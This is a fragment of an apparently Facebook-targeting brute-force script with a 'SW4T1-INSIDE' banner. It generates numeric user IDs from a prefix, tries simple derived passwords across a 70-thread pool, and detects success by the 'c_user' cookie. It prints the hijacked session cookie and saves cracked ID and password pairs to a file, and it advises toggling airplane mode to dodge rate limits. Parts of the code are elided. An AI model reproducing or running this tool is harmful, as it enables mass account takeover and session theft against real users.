...
logo = """
        ...
        \033[1;32m ##     ##          ##          ##
        \033[1;32m ##     ##    ##    ##    ##    ##
        \033[1;32m ##     ##     ######      ######  \033[1;32m SW4T1-INSIDE\033[1;37m 
--------------------------------------------------
...
def svn_digit():
	...
	with ThreadPool(max_workers=70) as yaari:
		...
		print('\033[1;32m[•] USE FLIGHT [\033[1;32mAIRPLANE\033[1;32m] MODE IN EVERY 5 MINUTES')
		lines()
		for guru in user:
			uid = kode+guru
			pwx = [guru,kode+guru]
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[SW4T1-0K] '+cid+'|'+ps+'\033[0;97m\n[‎‎🍁]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                open('AB-KHANX-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
